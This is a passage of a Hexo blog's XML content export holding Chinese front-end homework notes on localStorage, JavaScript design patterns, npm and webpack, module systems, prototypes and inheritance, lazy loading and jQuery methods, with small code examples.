有什么区别？ localStorage 如何存储删除数据。 cookie数据始终在同源的http请求中携带（即使不需要），即cookie在浏览器和服务器间来回传递；cookie数据还有路径（path）的概念，可以限制cookie只属于某个路径下。 存储大小限制也不同，cookie数据不能超过4k，同时因为每次http请求都会携带cookie，所以cookie只适合保存很小的数据，如会话标识。而localStorage不会自动把数据发给服务器，仅在本地保存。localStorage 虽然也有存储大小的限制，但比cookie大得多，可以达到5M或更大。 数据有效期不同，localStorage：始终有效，窗口或浏览器关闭也一直保存，因此用作持久数据；cookie只在设置的cookie过期时间之前一直有效，即使窗口或浏览器关闭。 作用域不同，localStorage 在所有同源窗口中都是共享的；cookie也是在所有同源窗口中都是共享的。Web Storage 支持事件通知机制，可以将数据更新的通知发送给监听者。Web Storage 的 api 接口使用更方便。 localStorage CURD123456//增改localStorage.setItem('myCat', 'Tom');//删localStorage.removeItem("myCat");//查var cat = localStorage.getItem("myCat"); 代码作业 写出如下 CSS3效果的简单事例 圆角， 圆形 div 阴影 2D 转换：放大、缩小、偏移、旋转 3D 转换：移动、旋转 背景色渐变 过渡效果 动画 实现如下全屏图加过渡色的效果（具体效果随意）DEMO 写出如下 loading 动画效果 DEMO1 DEMO2高级7]]></content>
      <tags>
        <tag>技术博客</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[常见前端设计模式]]></title>
    <url>%2Fblog%2F2017%2F11%2F19%2F%E5%B8%B8%E8%A7%81%E5%89%8D%E7%AB%AF%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%2F</url>
    <content type="text"><![CDATA[写出 构造函数模式、混合模式、模块模式、工厂模式、单例模式、发布订阅模式的范例。四个简单设计模式分别是 构造函数模式构造函数模式充分的利用了js的基于原型的面向对象思想1234567891011function Person(name, age) &#123; this.name = name this.age = age&#125;Person.prototype = &#123; sayName: function () &#123; console.log(this.name) &#125;&#125;var zainking = new Person('zain', 21)zainking.sayName() 工厂模式工厂模式主要的特点是在函数内部封装一个对象123456789101112function Person(name, age) &#123; var p = &#123; name: name, age: age, sayName: function () &#123; console.log(this.name) &#125; &#125; return p&#125;var zainking = Person('zain', 21)zainking.sayName() 模块模式模块模式主要体现在IIFE上1234var doSomething = (function()&#123; console.log('doSomething') return 'exploreSomething'&#125;)('requireSomething') 混合模式混合模式主要应用于继承 1234567891011121314151617181920function Person (name, age) &#123; this.name = name this.age = age&#125;Person.prototype = &#123; sayName: function () &#123; console.log(this.name) &#125;&#125;function Student (name, age, score) &#123; Person.call(this, name, age) this.score = score&#125;Student.prototype = Object.create(Person.prototype)Student.prototype.sayScore = function () &#123; console.log(this.score)&#125;var zainking = new Student('zain', 21, 90)zainking.sayName()zainking.sayScore() 两个较为独立的设计模式 单例模式单例模式提供了只实例化某一个实例的方法，常常应用于dialog等组件 123456789101112131415161718var Singleton = (function () &#123; var instantiated function init () &#123; console.log('do something only once') return 'some public function and value' &#125; return &#123; getInstantiated: function () &#123; if(!instantiated)&#123; instantiated = init() &#125; return instantiated &#125; &#125;&#125;)()Singleton.getInstantiated()Singleton.getInstantiated() 发布订阅模式发布订阅模式提供了定义行为和调用行为的分离，常用于异步操作123456789101112131415161718192021222324252627282930313233// 我认为基于事件池的发布订阅模式不应该简单的在fire中传参function Pub () &#123; this.evtPool = &#123;&#125;&#125;Pub.prototype.on = function (evt, callback) &#123; this.evtPool[evt] = this.evtPool[evt] || [] this.evtPool[evt].push(callback)&#125;Pub.prototype.off = function (evt) &#123; if (this.evtPool[evt]) &#123; delete this.evtPool[evt] &#125;&#125;Pub.prototype.fire = function (evt) &#123; if (this.evtPool[evt]) &#123; for (var i = 0;i &lt; this.evtPool[evt].length;i++) &#123; this.evtPool[evt][i](); &#125; &#125; else &#123; console.log('Event is not exist!') &#125;&#125;var evenList1 = new Pub()evenList1.on('hello', function()&#123; console.log('hello')&#125;)evenList1.fire('hello')evenList1.on('hello', function()&#123; console.log('world')&#125;)evenList1.fire('hello')evenList1.off('hello')evenList1.fire('hello') 使用发布订阅模式写一个事件管理器，可以实现如下方式调用12345678910111213141516171819202122232425//需要传参的发布订阅模式不应该使用事件池Event = (function () &#123; var events = &#123;&#125; return &#123; on: function (evt, callback) &#123; events[evt] = callback &#125;, off: function (evt) &#123; delete events[evt] &#125;, fire: function () &#123; var evt = Array.prototype.shift.call(arguments) if (events[evt]) &#123; events[evt].apply(this, arguments) &#125; else &#123; console.log('Event is not exist!') &#125; &#125; &#125;&#125;)()Event.on('change', function(val)&#123; console.log('change... now val is ' + val); &#125;);Event.fire('change', '饥人谷');Event.off('change');]]></content>
      <tags>
        <tag>技术博客</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[gulp_webpack_npmscript]]></title>
    <url>%2Fblog%2F2017%2F10%2F23%2Fgulp-webpack-npmscript%2F</url>
    <content type="text"><![CDATA[如何全局安装一个 node 应用?命令行中输入下列代码即可 npm i -g &lt;application name&gt; package.json 有什么作用？package.json 是npm的工程配置文件，在里面配置了一些参数来方便我们生成npm工程。让我们通过实例的方式来学习这个文件：1234567891011121314151617181920212223242526272829303132333435&#123; "name": "Hello World", "version": "0.0.1", "author": "张三", "description": "第一个node.js程序", "keywords":["node.js","javascript"], "repository": &#123; "type": "git", "url": "https://path/to/url" &#125;, "license":"MIT", "engines": &#123;"node": "0.10.x"&#125;, "bugs":&#123;"url":"http://path/to/bug","email":"bug@example.com"&#125;, "contributors":[&#123;"name":"李四","email":"lisi@example.com"&#125;], "scripts": &#123; "start": "node index.js" &#125;, "dependencies": &#123; "express": "latest", "mongoose": "~3.8.3", "handlebars-runtime": "~1.0.12", "express3-handlebars": "~0.5.0", "MD5": "~1.2.0" &#125;, "devDependencies": &#123; "bower": "~1.2.8", "grunt": "~0.4.1", "grunt-contrib-concat": "~0.3.0", "grunt-contrib-jshint": "~0.7.2", "grunt-contrib-uglify": "~0.2.7", "grunt-contrib-clean": "~0.5.0", "browserify": "2.36.1", "grunt-browserify": "~1.3.0", &#125;&#125;这是一个比较完整的package.json文件，其中各个字段的含义分别如下： name: 工程名称，如果是要发布npm包的情况，此名称必须全网唯一。 version: 工程版本，如果是要更新npm包的情况，此版本号必须增加。 author: 工程作者。 description: 工程描述。 keywords: 工程描述关键词。 repository: 工程源代码地址。 license: 工程遵循的开源协议。 engines: 工程所使用的引擎。 bugs: 工程如果出现BUG，该向哪里提交。 contributors: 为工程做出贡献的人。 scripts: 自定义的npm脚本，除test和start两条命令可以用npm xxx在命令行执行之外其他的命令必须用npm run xxx执行，这个对象中的键值对键名代表npm脚本的命令，而值则代表实际执行的命令。 dependencies: 工程所依赖的包，当在执行npm install命令时，将会根据此对象中的属性来安装依赖。 devDependencies: 工程构建者构建工程所依赖的包，这个对象中的依赖仅仅在构建工程时安装。 还有一些其他的配置见package.json中文网 npm install –save app 与 npm install –save-dev app有什么区别?npm install --save app 此命令可以令npm将app包安装到本目录工程中node_modules目录中，并将此软件包最新版本的字段保存到package.json的dependencies对象中。如果存在发布了这个工程到npm的情况，那么所有引入本工程的工程将自动加载此包。 npm install –save-dev app 此命令可以令npm将app包安装到本目录工程中node_modules目录中，并将此软件包最新版本的字段保存到package.json的devDependencies对象中。如果存在发布了这个工程到npm的情况，默认情况下（生产环境）不会自动加载这些包，只有在设置成开发环境（通常是针对某一个特定的脚本指定 NODE_ENV）的情况下会引入此包。 node_modules的查找路径是怎样的?先查找本文件同级目录下node_modules文件夹内是否存在引入的依赖对象，如果不存在，那么寻找本文件上级目录下的node_modules文件夹，依次向上寻找直到根目录。 webpack是什么？和其他同类型工具比有什么优势？webpack是一个“模块打包工具”，它可以编译各种语言成为浏览器可以执行的css，js，html；也可以模块化引入文件进行压缩合并等操作，还可以通过插件来实现一些其他的前端工作流操作例如将文件名加上hash以避免缓存等。它具有以下优势 代码拆分Webpack 有两种组织模块依赖的方式，同步和异步。异步依赖作为分割点，形成一个新的块。在优化了依赖树后，每一个异步区块都作为一个文件被打包。LoaderWebpack 本身只能处理原生的 JavaScript 模块，但是 loader 转换器可以将各种类型的资源转换成 JavaScript 模块。这样，任何资源都可以成为 Webpack 可以处理的模块。 智能解析Webpack 有一个智能解析器，几乎可以处理任何第三方库，无论它们的模块形式是 CommonJS、 AMD 还是普通的 JS 文件。甚至在加载依赖的时候，允许使用动态表达式 require(“./templates/“ + name + “.jade”)。 插件系统Webpack 还有一个功能丰富的插件系统。大多数内容功能都是基于这个插件系统运行的，还可以开发和使用开源的 Webpack 插件，来满足各式各样的需求。 快速运行Webpack 使用异步 I/O 和多级缓存提高运行效率，这使得 Webpack 能够以令人难以置信的速度快速增量编译。 npm script是什么？如何使用？npm script是npm工具提供的脚本工具，可以用于简化原来需要写较长的命令行或者几个命令行操作，来形成前端工作流。npm script脚本的使用方式就是在需要使用的工程的package.json文件的script对象中按照键值对的形式来书写脚本和原命令行，以本博客为例：12345678//package.json&#123; ... ... "scripts": &#123; "start": "hexo g &amp;&amp; hexo d &amp;&amp; git add . &amp;&amp; git commit -m 'Autoupdate-By-npmScript' &amp;&amp; git push" &#125;&#125;仅npm start一行代码，就实现了hexo博客的编译发布和备份。 代码作业 使用 webpack 替换 入门-任务15中模块化使用的 requriejs gulp是什么？使用 gulp 实现图片压缩、CSS 压缩合并、JS 压缩合并 高级5]]></content>
      <tags>
        <tag>技术博客</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[AMD_CMD_RequireJS]]></title>
    <url>%2Fblog%2F2017%2F10%2F21%2FAMD-CMD-RequireJS%2F</url>
    <content type="text"><![CDATA[为什么要使用模块化？ 解决命名冲突 依赖管理 提高代码可读性 代码解耦，提高复用性 CMD、AMD、CommonJS 规范分别指什么？有哪些应用commonjs是用在服务器端的，同步的，如nodejs。amd, cmd是用在浏览器端的，异步的，如requirejs和seajs。其中，amd先提出，cmd是根据commonjs和amd基础上提出的。 三种模块化方式写法如下： commonjs12345678//math.jsexports.add = function() &#123; var sum = 0, i = 0, args = arguments, l = args.length; while (i &lt; l) &#123; sum += args[i++]; &#125; return sum;&#125;; 12345//increment.jsvar add = require('math').add;exports.increment = function(val) &#123; return add(val, 1);&#125;; 1234//program.js var inc = require('increment').increment; var a = 1; inc(a); // 2 AMD1234define('modal', ['jQuery', 'dialog'], function($, Dialog)&#123; $('.modal').show(); Dialog.open();&#125;); CMD12345678910//math.jsdefine(function(require, exports, module) &#123; exports.add = function() &#123; var sum = 0, i = 0, args = arguments, l = args.length; while (i &lt; l) &#123; sum += args[i++]; &#125; return sum; &#125;;&#125;); 1234567//increment.jsdefine(function(require, exports, module) &#123; var add = require('math').add; exports.increment = function(val) &#123; return add(val, 1); &#125;;&#125;); 12345678//program.jsdefine(function(require, exports, module) &#123; var inc = require('increment').increment; var a = 1; inc(a); // 2 module.id == "program";&#125;); 使用 requirejs 完善入门任务15，包括如下功能： 首屏大图为全屏轮播 有回到顶部功能 图片区使用瀑布流布局（图片高度不一），下部有加载更多按钮，点击加载更多会加载更多数据(数据在后端 mock) 高级4]]></content>
      <tags>
        <tag>技术博客</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[this_原型链_继承]]></title>
    <url>%2Fblog%2F2017%2F10%2F19%2Fthis-%E5%8E%9F%E5%9E%8B%E9%93%BE-%E7%BB%A7%E6%89%BF%2F</url>
    <content type="text"><![CDATA[apply、call 、bind有什么作用，什么区别三个函数的作用都是 改变函数执行上下文 ，这句话翻译过来就是 更改函数中this的指向 ，三个函数只不过是在调用方式上有所不同，具体不同请看以下实例：12345678910111213141516var obj1 = &#123; name: 'xiaoming', age: 18, selfIntroduce : function(sex)&#123; console.log('My name is ' + this.name + ' ,and i am ' + this.age + ' years old.I am a ' + sex + '.'); &#125;&#125;;var obj2 = &#123; name: 'xiaogang', age: 25&#125;obj1.selfIntroduce('boy'); //My name is xiaoming ,and i am 18 years old.I am a boy.obj1.selfIntroduce.bind(obj2)('girl'); //My name is xiaogang ,and i am 25 years old.I am a girl.obj1.selfIntroduce.call(obj2,'girl'); //My name is xiaogang ,and i am 25 years old.I am a girl.obj1.selfIntroduce.call(obj2,['girl']); //My name is xiaogang ,and i am 25 years old.I am a girl. 从以上代码可以见得，这三个函数分别以不同的方式将此函数的执行上下文更改成了obj2，Function.prototype.bind()方法内参数为执行上下文对象，返回执行上下文为此对象的一个函数；Function.prototype.call()方法第一个参数为执行上下文对象，第二个及以后的参数依次为此函数的参数，并直接依此执行此函数；Function.prototype.apply()方法则与Function.prototype.call()方法类似，只不过最后的参数序列更换为了一个数组。 以下代码输出什么?12345678var john = &#123; firstName: "John"&#125;function func() &#123; alert(this.firstName + ": hi!")&#125;john.sayHi = func // ajohn.sayHi() //John: hi! 在a步骤进行赋值时，实际上john对象内部的sayHi函数执行上下文已经被指定为john对象，所以函数中的this指向john。 下面代码输出什么，为什么1234func()//[object Window]function func() &#123; alert(this)&#125; 在未被对象包裹的函数被调用时，视为被window对象调用。 下面代码输出什么123456document.addEventListener('click', function(e)&#123; console.log(this); //#document setTimeout(function()&#123; console.log(this);//window &#125;, 200);&#125;, false); setTimeout函数是window对象的方法，在它内部声明的回调函数被window对象调用。 下面代码输出什么，why12345678var john = &#123; firstName: "John"&#125;function func() &#123; alert( this.firstName )&#125;func.call(john) //John 如题1所述，call方法改变了func函数的执行上下文，将john对象作为func函数的执行上下文运行。 以下代码有什么问题，如何修改123456789101112var module= &#123; bind: function()&#123; $btn.on('click', function()&#123; console.log(this) //this指什么 this.showMsg(); &#125;) &#125;, showMsg: function()&#123; console.log('饥人谷'); &#125;&#125; 12345678910111213var module= &#123; bind: function()&#123; var self = this; $btn.on('click', function()&#123;// console.log(this) //this指$btn[0] self.showMsg(); &#125;) &#125;, showMsg: function()&#123; console.log('饥人谷'); &#125;&#125; 有如下代码，解释Person、 prototype、__proto__、p、constructor之间的关联。12345678function Person(name)&#123; this.name = name;&#125;Person.prototype.sayName = function()&#123; console.log('My name is :' + this.name);&#125;var p = new Person("若愚")p.sayName(); 上例中，对对象 p可以这样调用 p.toString()。toString是哪里来的? 画出原型图?并解释什么是原型链。p.toString()是从Person对象的原型对象Object对象中来的。函数的原型对象constructor默认指向函数本身，原型对象除了有原型属性外，为了实现继承，还有一个原型链指针proto，该指针指向上一层的原型对象，而上一层的原型对象的结构依然类似，这样利用proto一直指向Object的原型对象上，而Object的原型对象用Object.prototype.__proto__ = null表示原型链的最顶端，如此变形成了javascript的原型链继承，同时也解释了为什么所有的javascript对象都具有Object的基本方法。水乙：三张图搞懂JavaScript的原型对象与原型链 对String做扩展，实现如下方式获取字符串中频率最高的字符12345678910111213141516171819String.prototype.getMostOften = function()&#123; var mostNum = 0, currentNum = 0, mostChar = this[0]; for(var i = 0;i &lt; this.length;i++)&#123; currentNum = 0; for(var j = i;j &lt; this.length;j++)&#123; if(this[i] === this[j])&#123; currentNum++; if(currentNum &gt; mostNum)&#123; mostNum = currentNum; mostChar = this[i]; &#125; &#125; &#125; &#125; return mostChar;&#125;var str = 'ahbbccdeddddfg';var ch = str.getMostOften();console.log(ch); //d , 因为d 出现了5次 instanceOf有什么作用？内部逻辑是如何实现的？Object.prototype.instanceOf(Constructor)可以判断这个实例对象是否是某个构造函数的后代。它会去寻找此对象中__proto__属性中constructor属性是否与参数吻合，如果不吻合则寻找下一级__proto__属性中的constructor属性是否吻合，一直寻找到Object构造函数，如果全部没有吻合则返回false，有一个吻合就返回true。 继承有什么作用? 可以使对象派生结构清晰。 可以节省重复代码。 如果父级类属性改变，则只需更改父级类，继承的子级类自动得到修改。 下面两种写法有什么区别?1234567891011121314151617181920//方法1function People(name, sex)&#123; this.name = name; this.sex = sex; this.printName = function()&#123; console.log(this.name); &#125;&#125;var p1 = new People('饥人谷', 2)//方法2function Person(name, sex)&#123; this.name = name; this.sex = sex;&#125;Person.prototype.printName = function()&#123; console.log(this.name);&#125;var p1 = new Person('若愚', 27); 第一种写法在每次实例化对象时都在实例对象中生成一个单独的printName方法，每一个函数占用一块内存。第二种写法只需要开辟一块内存存放printName方法即可，其他所有实例对象的原型指向含有这个函数的原型对象，节省内存。 Object.create 有什么作用？兼容性如何？Object.create(prototype, descriptors)创建一个具有指定原型且可选择性地包含指定属性的对象。prototype 必需。 要用作原型的对象。 可以为 null。descriptors 可选。 包含一个或多个属性描述符的 JavaScript 对象。“数据属性”是可获取且可设置值的属性。 数据属性描述符包含 value 特性，以及 writable、enumerable 和 configurable 特性。 如果未指定最后三个特性，则它们默认为 false。 只要检索或设置该值，“访问器属性”就会调用用户提供的函数。 访问器属性描述符包含 set 特性和/或 get 特性。12345678910var pt = &#123; say : function()&#123; console.log('saying!'); &#125; &#125; var o = Object.create(pt); console.log('say' in o); // true console.log(o.hasOwnProperty('say')); // falseObject.create()是ES5语法，仅在支持ES5语法的浏览器上可以实现。 hasOwnProperty有什么作用？ 如何使用？hasOwnProperty()用于判断此实例对象是否含有此属性,如上题代码，say是pt的属性，o可以以它的子代身份调用，但是检测发现并非其自带属性。 如下代码中call的作用是什么?12345678function Person(name, sex)&#123; this.name = name; this.sex = sex;&#125;function Male(name, sex, age)&#123; Person.call(this, name, sex); //这里的 call 有什么作用 this.age = age;&#125; 这里的call相当于实现属性的继承。可以将Person的属性全部继承给Male。 补全代码，实现继承123456789101112131415161718192021222324function Person(name, sex)&#123; this.name = name; this.sex = sex;&#125;Person.prototype.getName = function()&#123; console.log(this.name);&#125;; function Male(name, sex, age)&#123; Person.call(this, name, sex); this.age = age;&#125;function fn()&#123;&#125;;fn.prototype = Person.prototype;Male.prototype = new fn();Male.prototype.constructor = Male;Male.prototype.getAge = function()&#123; console.log(this.age);&#125;;var ruoyu = new Male('若愚', '男', 27);ruoyu.getName();]]></content>
      <tags>
        <tag>技术博客</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[对象_原型]]></title>
    <url>%2Fblog%2F2017%2F10%2F12%2F%E5%AF%B9%E8%B1%A1-%E5%8E%9F%E5%9E%8B%2F</url>
    <content type="text"><![CDATA[OOP 指什么？有哪些特性 Object-oriented programming (OOP) is a programming paradigm based on the concept of “objects”, which may contain data, in the form of fields, often known as attributes; and code, in the form of procedures, often known as methods. A feature of objects is that an object’s procedures can access and often modify the data fields of the object with which they are associated (objects have a notion of “this” or “self”). In OOP, computer programs are designed by making them out of objects that interact with one another. There is significant diversity of OOP languages, but the most popular ones are class-based, meaning that objects are instances of classes, which typically also determine their type.[1] 从维基百科对面向对象编程的论述不难看出，所谓“面向对象”是一种编程范式，与它相对的在web领域常用编程范式有“面向过程”，“函数式编程”等。面向对象编程常把各个编程单元抽象成不同的对象，对他们附加属性和方法（在函数式编程时这两个名词常被称之为变量和函数），通过各个对象间相互调用来达成最终目标。同时上述引文中提到 There is significant diversity of OOP languages, but the most popular ones are class-based, meaning that objects are instances of classes, which typically also determine their type. 很幸运…Javascript就不是一门class-based面向对象语言，而是一门像是loke、ink之类的prototype-based编程语言。就本题目而言，基于类的面向对象语言如Java，C#等往往拥有继承，封装，多态三大特性。而Javascript则拥有基于原型链的继承（事实上还有另外两种著名的继承方式），基于原型模式和构造函数模式或工厂模式创建的对象实现的封装，以及以参数数组或者判断结构实现的多态[2]。 如何通过构造函数的方式创建一个拥有属性和方法的对象?123456789function Person(name, age, job)&#123; this.name = name; this.age = age; this.sayName = function()&#123; alert(this.name); &#125;&#125;var xiaoming = new Person('小明','16','student');var xiaogang = new Person('小刚','28','designer'); 上述代码就以构造函数的方式创建了一个拥有属性和方法的对象。构造函数的重点就是new运算符的作用,它做了以下四件事： 创建了一个新对象 将构造函数的作用域赋值给新对象（注意：此时this指针指向了这个新对象） 执行函数中的代码 返回新对象 往往写构造函数时有以下约定俗成的规则： 没有return 以大写字母开头以区分其他函数 它有以下特点： 相对于工厂模式创建对象，它拥有constructor属性指向初始构造函数，可以明确认出他们的类型与祖先 相对于原型链模式创建对象，它每次创建对象都创建所有属性方法的实例，对内存不友好 这就是以构造函数方式新建对象的方法。[2] prototype 是什么？有什么特性我们创建的每一个函数都有prototype属性，这个属性的值是一个指针，指向这个函数的“原型对象”。构造函数中原型对象的作用是让他的实例共享此原型公有的属性和方法。原型对象有一个constructor属性，这个属性的值是一个指针，指向构造函数。每个实例对象都有一个proto属性，这个属性的值和他的构造函数的prototype属性的值相同，指向原型对象。正如原型对象的作用所言，当我们在某个构造函数的实例对象中寻找属性A的时候，如果本实例对象内不存在属性A，则会向其原型对象中寻找，直到Object对象。即使通过一个实例对象修改原型对象中的某个属性的值，所有的实例对象访问原型对象时候这个值都会被改变。 画出如下代码的原型图12345678910111213function People (name)&#123; this.name = name; this.sayName = function()&#123; console.log('my name is:' + this.name); &#125;&#125;People.prototype.walk = function()&#123; console.log(this.name + ' is walking'); &#125;var p1 = new People('饥人谷');var p2 = new People('前端'); 创建一个 Car 对象，拥有属性name、color、status；拥有方法run，stop，getStatus123456789101112131415function Car(name, color)&#123; this.name = name; this.color = color; this.status = "stop";&#125;Car.prototype.run = function()&#123; this.status = "run";&#125;Car.prototype.stop = function()&#123; this.status = "stop";&#125;Car.prototype.getStatus = function()&#123; return this.status;&#125;var bmw = new Car('BMW 1系运动轿车','blue'); 创建一个 GoTop 对象，当 new 一个 GoTop 对象则会在页面上创建一个回到顶部的元素，点击页面滚动到顶部。拥有以下属性和方法 ct属性，GoTop 对应的 DOM 元素的容器 target属性， GoTop 对应的 DOM 元素 bindEvent 方法， 用于绑定事件 createNode 方法， 用于在容器内创建节点 html代码：12345678910111213141516171819202122232425262728293031323334&lt;!DOCTYPE html&gt;&lt;html&gt; &lt;head&gt; &lt;meta charset="utf-8"&gt; &lt;title&gt;GoTop&lt;/title&gt; &lt;style&gt; .ct&#123; height: 1900px; background-color: #ccc; &#125; .target&#123; width:50px; height:50px; background-color: #eee; line-height: 50px; text-align: center; font-size: 35px; font-weight: 700; position: fixed; bottom: 50px; right: 50px; cursor: pointer; &#125; .target:hover&#123; background-color: #000; color: #fff; &#125; &lt;/style&gt; &lt;/head&gt; &lt;body&gt; &lt;div class="ct"&gt; &lt;/div&gt; &lt;/body&gt;&lt;/html&gt;js代码：123456789101112131415161718function GoTop(ct)&#123; this.ct = ct; this.target = &#123;&#125;; this.createNode(); this.bindEvent();&#125;GoTop.prototype.bindEvent = function()&#123; this.target.addEventListener('click',function()&#123; window.scrollTo(0,0); &#125;);&#125;;GoTop.prototype.createNode = function()&#123; this.target = document.createElement('div'); this.target.classList.add('target'); this.target.innerText = '↑'; this.ct.appendChild(this.target);&#125;;new GoTop(document.querySelector('.ct')); 使用木桶布局实现一个图片墙高级1（改进了原课程的算法） [1] Wikipedia.Object-oriented programming[EB/OL].https://en.wikipedia.org/wiki/Object-oriented_programming, 2017–10–02/2005–08–11.[2]Nicholas C.Zakas. Professional JavaScript for Web Developers 3rd Edition [M]. John Wiley &amp; Sons,Inc, 2012: 138 – 174.]]></content>
      <tags>
        <tag>技术博客</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[轮播]]></title>
    <url>%2Fblog%2F2017%2F10%2F09%2F%E8%BD%AE%E6%92%AD%2F</url>
    <content type="text"><![CDATA[轮播的实现原理是怎样的？如果让你来实现，你会抽象出哪些函数(or接口)供使用？（比如 play()）左右滚动轮播的实现原理就是将图片横排后，通过绝对定位改变其css left值，以overflow hidden的容器圈定它的显示范围来实现，如果让我来实现，我会定义next()，previous()，goto(currentPage)三个方法。具体实现见代码。而透明度变换轮播因为没有左右动画界限问题，只需要定义一个goto(currentPage)方法即可解决。 实现左右滚动无限循环轮播效果以及一个渐变轮播效果进阶17]]></content>
      <tags>
        <tag>技术博客</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[懒加载]]></title>
    <url>%2Fblog%2F2017%2F10%2F08%2F%E6%87%92%E5%8A%A0%E8%BD%BD%2F</url>
    <content type="text"><![CDATA[如何判断一个元素是否出现在窗口可视范围（浏览器的上边缘和下边缘之间，肉眼可视）。写一个函数 isVisible实现123function isVisible($node)&#123; return ($node.offset().top &gt; $(window).scrollTop() &amp;&amp; $node.offset().top &lt; ($(window).scrollTop() + $(window).height()));&#125; 当窗口滚动时，判断一个元素是不是出现在窗口可视范围。每次出现都在控制台打印 true 。用代码实现123456//结合题目1函数实现$(window).on('scroll',function()&#123; if(isVisible($node))&#123; console.log('true'); &#125; &#125;); 当窗口滚动时，判断一个元素是不是出现在窗口可视范围。在元素第一次出现时在控制台打印 true，以后再次出现不做任何处理。用代码实现1234567//结合题目1函数实现$(window).on('scroll',function()&#123; if(isVisible($node) &amp;&amp; !$(node).attr('data-isSeen'))&#123; console.log('true'); $(node).attr('data-isSeen','true'); &#125; &#125;); 图片懒加载的原理是什么？定义 ‘图片被加载’ 为 展示图片的img标签的src属性为相应的图片地址。页面初始状态，将所有图片的src属性定为统一的预加载图片地址，并将图片真实地址存储于标签属性，数组或者后端数据库内。如题目三与题目一原理，在页面滚动时判断图片是否处于视域内，如果是则从存储中将图片真实src载入。此时浏览器引擎将加载图片。 实现视频中的图片懒加载效果进阶16]]></content>
      <tags>
        <tag>技术博客</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[jQuery动画与ajax]]></title>
    <url>%2Fblog%2F2017%2F10%2F06%2FjQuery%E5%8A%A8%E7%94%BB%E4%B8%8Eajax%2F</url>
    <content type="text"><![CDATA[jQuery 中， $(document).ready()是什么意思？当 DOM（文档对象模型） 已经加载，并且页面（包括图像）已经完全呈现时，会发生 ready 函数中的回调函数。 $node.html()和$node.text()的区别? html与.text的方法操作是一样，只是在具体针对处理对象不同 html处理的是元素内容，.text处理的是文本内容 html只能使用在HTML文档中，.text 在XML 和 HTML 文档中都能使用, 如果处理的对象只有一个子文本节点，那么html处理的结果与text是一样的; 也就是说，当处理的对象有两个以上的子节点时，.html()只会替换第一个子节点的内容（也可以通过选择器指定替换的子节点），.text则会将对象中的所有文本替换 $.extend 的作用和用法?jQuery.extend(object)扩展jQuery对象本身。示例：1234567/* 此时min和max方法拓展到jq全局对象上 */jQuery.extend(&#123;min: function(a, b) &#123; return a &lt; b ? a : b; &#125;,max: function(a, b) &#123; return a &gt; b ? a : b; &#125;&#125;);jQuery.min(2,3); // 2jQuery.max(4,5); // 51234567891011/* 此时min和max方法拓展到jq实例对象上 */jQuery.fn.extend(&#123;min: function(a, b) &#123; return a &lt; b ? a : b; &#125;,max: function(a, b) &#123; return a &gt; b ? a : b; &#125;&#125;);$("div").min(2,3); // 2$("div").max(4,5); // 5/* 此时b和c拓展到a上 */var a = &#123;&#125;,b=&#123;name:'zain',age:18&#125;,c:&#123;sex:'man'&#125;jQuery.extend(a,b,c);console.log(a); // &#123;name:'zain',age:'18',sex:'man'&#125; jQuery 的链式调用是什么？jQuery中的链式调用是指形如$(selector).append(‘hello’).css(‘line-height’,’1.5’)的直接把下一个操作写在上一个操作后的写法，原理是jQuery的非求值函数调用返回其自身。 jQuery 中 data 函数的作用用于存取当前匹配jQuery对象上的数据。可以通过jQueryObject.data( [ key [, value ] ])的形式存取数据或者直接传入一个对象以设置多个键值对。 写出以下功能对应的 jQuery 方法：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354/*给元素 $node 添加 class active，给元素 $noed 删除 class active*/$node.addClass('active');$node.removeClass('active');/*展示元素$node, 隐藏元素$node*/$node.show();$node.hide();/*获取元素$node 的 属性: id、src、title， 修改以上属性*///获取var nodeid = $node.attr('id');var nodesrc = $node.attr('src');var nodetitle = $node.attr('title');//设置$node.attr('id','node').attr('src','http://baidu.com').attr('title','baidu');/*给$node 添加自定义属性data-src*/$node.attr('data-src','//zain.red');/*在$ct 内部最开头添加元素$node*/$ct.prepend($node);/*在$ct 内部最末尾添加元素$node*/$ct.append($node);/*删除$node*/$node.remove();/*把$ct里内容清空*/$ct.empty();/*在$ct 里设置 html &lt;div class="btn"&gt;&lt;/div&gt;*/$ct.html('&lt;div class="btn"&gt;&lt;/div&gt;');/*获取、设置$node 的宽度、高度(分别不包括内边距、包括内边距、包括边框、包括外边距)*///宽度$node.width();//获取：区块的本身宽度$node.outerWidth();//获取：区块的宽度+padding宽度+border宽度$node.outerWidth(true);//获取：区块的宽度+padding宽度+border宽度+margin的宽度//高度$node.height();//获取：区块的本身高度$node.outerHeight();//获取：区块的高度+padding高度+border高度$node.outerHeight(true);//获取：区块的高度+padding高度+border高度+margin的高度/*获取窗口滚动条垂直滚动距离*/$(document).scrollTop(); /*获取$node 到根节点水平、垂直偏移距离*/$node.offset();/*修改$node 的样式，字体颜色设置红色，字体大小设置14px*/$node.css('color','#f00').css('font-size','14px');/*遍历节点，把每个节点里面的文本内容重复一遍*/$('*').each(function()&#123; $(this).text($(this).text()+$(this).text()) &#125;);/*从$ct 里查找 class 为 .item的子元素*/$ct.children('.item');/*获取$ct 里面的所有孩子*/$ct.children();/*对于$node，向上找到 class 为'.ct'的父亲，在从该父亲找到'.panel'的孩子*/$node.parents('.ct').children('.panel');/*获取选择元素的数量*/$node.length;/*获取当前元素在兄弟中的排行*/$node.index(); 用jQuery实现以下操作1234567891011121314151617181920212223242526272829/*当点击$btn 时，让 $btn 的背景色变为红色再变为蓝色*/$btn.on('click',function()&#123; $(this).animate(&#123;'background-color':'#f00'&#125;,1000).animate(&#123;'background-color':'#00f'&#125;,1000) &#125;)/*当窗口滚动时，获取垂直滚动距离*/$(window).scroll(function()&#123; console.log($(this).scrollTop())&#125;)/*当鼠标放置到$div 上，把$div 背景色改为红色，移出鼠标背景色变为白色*/$div.on('mouseenter',function()&#123; $(this).css('background-color','#f00'); &#125;);$div.on('mouseleave',function()&#123; $(this).css('background-color','#00f'); &#125;);/*当鼠标激活 input 输入框时让输入框边框变为蓝色，当输入框内容改变时把输入框里的文字小写变为大写，当输入框失去焦点时去掉边框蓝色，控制台展示输入框里的文字*/$input.on('focus',function()&#123; 